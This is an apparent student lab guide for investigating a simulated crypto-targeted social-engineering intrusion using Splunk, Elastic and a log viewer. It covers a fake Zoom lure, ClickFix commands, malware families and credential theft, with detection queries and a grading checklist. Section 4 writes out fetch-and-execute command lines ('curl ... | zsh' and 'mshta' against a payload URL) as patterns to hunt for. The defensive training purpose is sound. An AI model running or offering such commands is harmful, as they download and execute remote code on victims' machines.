# Student Click-by-Click Guide

Lab: `unc1069-crypto-ai-social-engineering-20260430-2046`

Scenario: UNC1069 targets a cryptocurrency/DeFi organization with a compromised Telegram account, fake Zoom meeting, ClickFix troubleshooting commands, and follow-on malware used to harvest host/browser/session data.

This guide walks you through the investigation step by step. Use it with Mucaro Scout, Splunk, or Elastic/OpenSearch Dashboards.

---

## 0. What you are trying to answer

By the end of the lab, you should be able to answer:

1. Which users and hosts interacted with suspicious meeting infrastructure?
2. Which domains and URLs were involved?
3. Which hosts executed ClickFix troubleshooting commands?
4. Which malware families appeared after execution?
5. What credentials, browser data, or session artifacts were targeted?
6. What detections would catch this activity next time?

Known high-value terms:

- `UNC1069`
- `zoom.uswe05.us`
- `mylingocoin.com`
- `http://mylingocoin.com/audio/fix/6454694440`
- `fake_zoom_lure`
- `clickfix_command_execution`
- `WAVESHAPER`
- `SUGARLOADER`
- `HYPERCALL`
- `HIDDENCALL`
- `SILENCELIFT`
- `DEEPBREATH`
- `CHROMEPUSH`

---

## 1. Load the lab data in Mucaro Scout

Use this path if your class uses Mucaro Scout as the lightweight log viewer.

### 1.1 Open Scout

1. Open your browser.
2. Go to the Mucaro Scout URL provided by your instructor.
   - Local default is usually `http://localhost:5173`.
3. Confirm the page title or header says **Mucaro Scout**.
4. Confirm you are on **Guided Search**.

### 1.2 Upload the combined dataset

1. Click **Upload data**.
2. In the upload modal, click the file picker/drop zone.
3. Browse to:

   ```text
   labs/unc1069-crypto-ai-social-engineering-20260430-2046/data/combined.jsonl
   ```

4. Select `combined.jsonl`.
5. Click **Upload & index**.
6. Wait for the success message.
7. Close the upload modal.

Expected result:

- Scout should ingest about `500` events.
- You should see events after running a search.

### 1.3 Alternative: upload source files separately

If your instructor wants source-by-source analysis, upload these one at a time instead:

```text
data/social.jsonl
data/dns.jsonl
data/proxy.jsonl
data/endpoint.jsonl
data/malware.jsonl
```

Recommended order:

1. `social.jsonl`
2. `dns.jsonl`
3. `proxy.jsonl`
4. `endpoint.jsonl`
5. `malware.jsonl`

Why this matters: it forces you to build the timeline like an analyst, not just search one giant bucket and declare victory. SOC work, but with fewer fluorescent lights.

---

## 2. Establish the social-engineering entry point

### 2.1 Search for the threat actor

1. Click the main search box.
2. Enter:

   ```text
   UNC1069
   ```

3. Set **Time range** to **All time**.
4. Click **Search**.
5. Review the results.

Record:

- First timestamp observed:
- First user observed:
- First host observed:
- First event dataset:
- First event type:

### 2.2 Search for fake Zoom infrastructure

1. Replace the query with:

   ```text
   zoom.uswe05.us
   ```

2. Click **Search**.
3. Filter mentally or sort visually for events where:
   - `event.dataset` is `social`
   - `event_type` is `fake_zoom_lure`
   - `domain` is `zoom.uswe05.us`

Record:

- Users who received or clicked the fake meeting link:
- Hosts associated with those users:
- URLs observed:

### 2.3 Identify the lure channel

1. Click into rows that mention Telegram or social activity.
2. Look for fields like:
   - `communication.channel`
   - `sender.account`
   - `message`

Answer:

- What channel was used for the lure?
- Was the sender normal or suspicious?
- What made the link suspicious?

Expected findings:

- Lure channel should point to Telegram-style social engineering.
- Sender account should reference a compromised crypto executive.
- Domain should point to fake Zoom infrastructure.

---

## 3. Identify ClickFix payload delivery

### 3.1 Search the payload domain

1. Search:

   ```text
   mylingocoin.com
   ```

2. Click **Search**.
3. Review DNS and proxy events.

Record:

- Which hosts resolved or connected to `mylingocoin.com`?
- Which users were associated with those hosts?
- Which event datasets contain the domain?

### 3.2 Search the full payload URL

1. Search:

   ```text
   http://mylingocoin.com/audio/fix/6454694440
   ```

2. Click **Search**.
3. Look for `proxy` and `endpoint` telemetry.

Record:

- Full URL:
- User agent:
- Destination IP:
- HTTP status code:
- Hosts that accessed it:

Expected finding:

- The payload URL should appear in web/proxy telemetry and endpoint command lines.

### 3.3 Search the payload ID

1. Search:

   ```text
   6454694440
   ```

2. Click **Search**.
3. Compare results across datasets.

Answer:

- Does the payload ID appear in more than one telemetry source?
- Which source gives you the best evidence of execution?
- Which source gives you the best network evidence?

---

## 4. Detect ClickFix command execution

### 4.1 Search for ClickFix event type

1. Search:

   ```text
   clickfix_command_execution
   ```

2. Click **Search**.
3. Focus on endpoint rows.

Record:

- Affected hosts:
- Affected users:
- Process names:
- Command lines:

### 4.2 Look for macOS command patterns

Search each of these terms:

```text
curl -A audio
```

```text
zsh
```

```text
system_profiler SPAudioData
```

For each search:

1. Enter the term.
2. Click **Search**.
3. Record matching hosts and command lines.

Mac-style suspicious command pattern:

```text
curl -A audio -s http://mylingocoin.com/audio/fix/6454694440 | zsh
```

### 4.3 Look for Windows command patterns

Search each of these terms:

```text
mshta
```

```text
pnputil
```

```text
AudioPlaybackDiagnostic
```

Windows-style suspicious command pattern:

```text
mshta http://mylingocoin.com/audio/fix/6454694440
```

Record:

- Windows hosts:
- Users:
- Process names:
- Command line evidence:

### 4.4 Decide if this is execution or just browsing

Use this rule of thumb:

- Proxy event only: network access happened.
- DNS event only: name resolution happened.
- Endpoint command line: execution likely happened.
- Malware event after command line: compromise likely progressed.

Answer:

- Which host has strongest evidence of compromise?
- Which event proves command execution most clearly?

---

## 5. Build the intrusion timeline

Create a timeline table in your notes.

Use these columns:

```text
Time | User | Host | Dataset | Event type | Domain/URL | What happened
```

### 5.1 Start with fake Zoom

Search:

```text
fake_zoom_lure
```

Add the first relevant event to your timeline.

### 5.2 Add DNS resolution

Search:

```text
mylingocoin.com
```

Add the earliest DNS event for the same user/host.

### 5.3 Add payload download

Search:

```text
clickfix_payload_download
```

Add the proxy event showing payload download.

### 5.4 Add endpoint execution

Search:

```text
clickfix_command_execution
```

Add endpoint command execution events.

### 5.5 Add malware deployment

Search:

```text
malware_execution
```

Add the malware events that follow.

Expected timeline shape:

```text
social lure -> DNS -> proxy download -> endpoint command -> malware execution -> credential/session targeting
```

---

## 6. Scope malware families

Search each malware family name:

```text
WAVESHAPER
```

```text
SUGARLOADER
```

```text
HYPERCALL
```

```text
HIDDENCALL
```

```text
SILENCELIFT
```

```text
DEEPBREATH
```

```text
CHROMEPUSH
```

For each one, record:

- Host:
- User:
- File path:
- Credential target:
- Timestamp:

### 6.1 Identify collection targets

Search:

```text
browser_cookies
```

Then search:

```text
session_tokens
```

Then search:

```text
wallet_keys
```

Answer:

- Which credential/session targets appear?
- Which hosts show multiple credential targets?
- Which users should be prioritized for password/session reset?

---

## 7. Write detections

You need at least four detections.

### 7.1 Detection 1: fake Zoom lure

Detection idea:

```text
domain: zoom.uswe05.us OR event_type: fake_zoom_lure
```

What it catches:

- Suspicious fake meeting infrastructure
- Social-engineering entry point

Weakness:

- Domain-specific. Attackers can rotate domains.

Better version:

```text
event.dataset: social AND sender.account: compromised-crypto-exec AND url.full contains zoom-like domain
```

### 7.2 Detection 2: ClickFix payload URL

Detection idea:

```text
url.full: http://mylingocoin.com/audio/fix/6454694440
```

What it catches:

- Known payload retrieval

Weakness:

- Exact URL is brittle.

Better version:

```text
process.command_line contains "curl" AND process.command_line contains "| zsh"
```

or:

```text
process.name: mshta.exe AND url.full starts with http
```

### 7.3 Detection 3: ClickFix command execution

Detection idea:

```text
event_type: clickfix_command_execution
```

Better generic logic:

```text
(process.command_line contains "softwareupdate --evaluate-products" AND process.command_line contains "curl")
OR
(process.name: mshta.exe AND process.command_line contains "http")
```

### 7.4 Detection 4: malware family names

Detection idea:

```text
malware.family IN (WAVESHAPER, SUGARLOADER, HYPERCALL, HIDDENCALL, SILENCELIFT, DEEPBREATH, CHROMEPUSH)
```

What it catches:

- Known tooling from the reported campaign

Weakness:

- Requires malware family labeling or EDR identification.

### 7.5 Detection 5: credential/session targeting

Detection idea:

```text
credential.target IN (browser_cookies, session_tokens, wallet_keys, telegram_data)
```

Why it matters:

- This maps to the campaign objective: credential, browser, and session theft.

---

## 8. Splunk click-by-click path

Use this if your instructor provides Splunk.

### 8.1 Upload or select data

1. Open Splunk.
2. Go to **Settings**.
3. Click **Add Data**.
4. Choose **Upload**.
5. Upload `data/combined.jsonl`.
6. Set sourcetype to JSON or `_json` if prompted.
7. Finish the upload.
8. Open **Search & Reporting**.

### 8.2 Search the fake Zoom domain

Paste:

```spl
index=* "zoom.uswe05.us"
| table _time event.dataset host.name user.name event_type domain url.full severity message
```

Click **Search**.

### 8.3 Search ClickFix execution

Paste:

```spl
index=* event_type=clickfix_command_execution
| table _time host.name user.name process.name process.command_line url.full severity
```

Click **Search**.

### 8.4 Scope malware

Paste:

```spl
index=* malware.family IN (WAVESHAPER,SUGARLOADER,HYPERCALL,HIDDENCALL,SILENCELIFT,DEEPBREATH,CHROMEPUSH)
| stats values(malware.family) as malware values(credential.target) as targets values(file.path) as paths by host.name user.name
```

Click **Search**.

### 8.5 Build a timeline

Paste:

```spl
index=* ("zoom.uswe05.us" OR "mylingocoin.com" OR event_type=clickfix_command_execution OR event_type=malware_execution)
| table _time event.dataset host.name user.name event_type domain url.full process.command_line malware.family credential.target severity message
| sort _time
```

Click **Search**.

Export or screenshot your timeline for submission.

---

## 9. Elastic / OpenSearch Dashboards click-by-click path

Use this if your instructor provides Elastic or OpenSearch Dashboards.

### 9.1 Open Discover

1. Open Dashboards.
2. Click the menu icon if needed.
3. Click **Discover**.
4. Select the lab data view/index pattern.
5. Set the time picker to cover February 9, 2026, or choose **All time**.

### 9.2 Search fake Zoom domain

In the query bar, enter:

```text
zoom.uswe05.us
```

Click **Refresh** or press Enter.

Add these columns if available:

- `@timestamp`
- `event.dataset`
- `host.name`
- `user.name`
- `event_type`
- `domain`
- `url.full`
- `severity`

### 9.3 Search payload activity

Search:

```text
mylingocoin.com
```

Then search:

```text
http://mylingocoin.com/audio/fix/6454694440
```

Record affected hosts/users.

### 9.4 Search endpoint execution

Search:

```text
event_type: clickfix_command_execution
```

Review process fields.

### 9.5 Search malware families

Search:

```text
WAVESHAPER OR SUGARLOADER OR HYPERCALL OR HIDDENCALL OR SILENCELIFT OR DEEPBREATH OR CHROMEPUSH
```

Record malware family, host, user, and credential target.

### 9.6 Optional ES|QL timeline

Open ES|QL and run:

```esql
FROM logs-*
| WHERE domain IN ("zoom.uswe05.us", "mylingocoin.com") OR url.full == "http://mylingocoin.com/audio/fix/6454694440" OR event_type IN ("clickfix_command_execution", "malware_execution")
| KEEP @timestamp, event.dataset, host.name, user.name, event_type, domain, url.full, process.command_line, malware.family, credential.target, severity, message
| SORT @timestamp ASC
```

---

## 10. Final deliverable

Submit a short report with these sections.

### 10.1 Executive summary

Write 3-5 sentences explaining what happened.

Include:

- Threat actor
- Initial lure
- Payload delivery
- Execution method
- Malware/credential theft objective

### 10.2 Affected users and hosts

Table:

```text
User | Host | Evidence | Confidence
```

### 10.3 Indicators observed

Table:

```text
Indicator | Type | Where observed | Notes
```

At minimum include:

- `zoom.uswe05.us`
- `mylingocoin.com`
- `http://mylingocoin.com/audio/fix/6454694440`
- `6454694440`
- Malware family names

### 10.4 Timeline

Table:

```text
Time | User | Host | Event | Evidence
```

### 10.5 Detection logic

Provide at least four detections:

1. Fake Zoom lure
2. ClickFix URL/payload access
3. Endpoint command execution
4. Malware family or credential-targeting behavior

For each detection, include:

- Query
- Why it works
- Expected false positives
- How to improve it

### 10.6 Response recommendations

Include at least five actions, such as:

- Isolate affected hosts
- Revoke sessions and tokens
- Reset passwords for affected users
- Review Telegram/social account compromise paths
- Block domains and payload URL
- Hunt for ClickFix command patterns across fleet
- Review browser credential/token theft exposure

---

## 11. Grading checklist

Your submission should show:

- [ ] Fake Zoom infrastructure identified
- [ ] Payload domain and URL identified
- [ ] At least one ClickFix command line found
- [ ] At least three malware families scoped
- [ ] At least one credential/session target identified
- [ ] Timeline includes social, DNS/proxy, endpoint, and malware events
- [ ] Detections include both IOC-based and behavior-based logic
- [ ] Response recommendations are practical and prioritized

If your answer is only a list of IOCs, keep going. That is an appetizer, not dinner.
